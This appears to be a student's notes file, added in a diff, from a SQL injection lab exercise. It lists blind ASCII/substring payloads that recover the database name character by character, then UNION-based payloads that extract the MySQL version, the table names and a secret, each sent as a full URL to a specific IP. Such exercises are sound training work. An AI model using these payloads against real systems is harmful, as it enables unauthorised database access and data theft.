@@ -1,0 +1,80 @@
+Length of db:
+1' AND (SELECT LENGTH(database()))=17#
+http://3.86.24.15/sqlinject3/?id=1%27+AND+%28SELECT+LENGTH%28database%28%29%29%29%3D17%23#
+
+
+Database name:
+1st character:
+1' and ascii(substring(database(),1,1))=112#
+2nd character:
+1' and (select ascii(substring(database(),2,1)))=114#
+3rd:
+1' and (select ascii(substring(database(),3,1)))=111#
+4th:
+1' and (select ascii(substring(database(),4,1)))=106#
+5th 
+1' and (select ascii(substring(database(),5,1)))=50#
+6th
+1' and (select ascii(substring(database(),6,1)))=95#
+7th:
+1' and (select ascii(substring(database(),7,1)))=120#
+8th:
+1' and (select ascii(substring(database(),8,1)))=116#
+9th
+http://3.86.24.15/sqlinject3/?id=1%27+and+%28select+ascii%28substring%28database%28%29%2C9%2C1%29%29%29%3E%3D114%23#
+10th
+http://3.86.24.15/sqlinject3/?id=1%27+and+%28select+ascii%28substring%28database%28%29%2C10%2C1%29%29%29%3E%3D97%23#
+11th
+http://3.86.24.15/sqlinject3/?id=1%27+and+%28select+ascii%28substring%28database%28%29%2C11%2C1%29%29%29%3E%3D95%23#
+12th
+http://3.86.24.15/sqlinject3/?id=1%27+and+%28select+ascii%28substring%28database%28%29%2C12%2C1%29%29%29%3E%3D99%23#
+13th
+http://3.86.24.15/sqlinject3/?id=1%27+and+%28select+ascii%28substring%28database%28%29%2C13%2C1%29%29%29%3E%3D114%23#
+14th
+http://3.86.24.15/sqlinject3/?id=1%27+and+%28select+ascii%28substring%28database%28%29%2C14%2C1%29%29%29%3E%3D51%23#
+15th:
+http://3.86.24.15/sqlinject3/?id=1%27+and+%28select+ascii%28substring%28database%28%29%2C15%2C1%29%29%29%3E%3D100%23#
+16th:
+http://3.86.24.15/sqlinject3/?id=1%27+and+%28select+ascii%28substring%28database%28%29%2C16%2C1%29%29%29%3E%3D105%23#
+17th:
+http://3.86.24.15/sqlinject3/?id=1%27+and+%28select+ascii%28substring%28database%28%29%2C17%2C1%29%29%29%3E%3D116%23#
+
+OR:
+0' union select 1,2,database()#
+
+
+Database version:
+0' union select 1,2,version()#
+http://3.86.24.15/sqlinject3/?id=0%27+union+select+1%2C2%2Cversion%28%29%23#
+5.5.50-0ubuntu0.14.04.1 
+
+
+
+table names:
+0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#	
+http://3.86.24.15/sqlinject3/?id=0%27+union+select+1%2C2%2Cgroup_concat%28table_name%29+from+information_schema.tables+where+table_schema%3Ddatabase%28%29%23#
+SECRETTABLE,foo,inject3_users 
+
+
+
+
+Secret string: 
+0' union select 1,2, COUNT(*) from SECRETTABLE#
+0' union select 1,2, secret from SECRETTABLE where id=1#
+http://3.86.24.15/sqlinject3/?id=0%27+union+select+1%2C2%2C+secret+from+SECRETTABLE+where+id%3D1%23#
+
+
+
+
+
+
+Database_name:     proj2_xtra_cr3dit
+Database version:  5.5.50-0ubuntu0.14.04.1 
+Tables: 	   SECRETTABLE,foo,inject3_users 
+Secret:		   <>
+
+
+
+
+
+
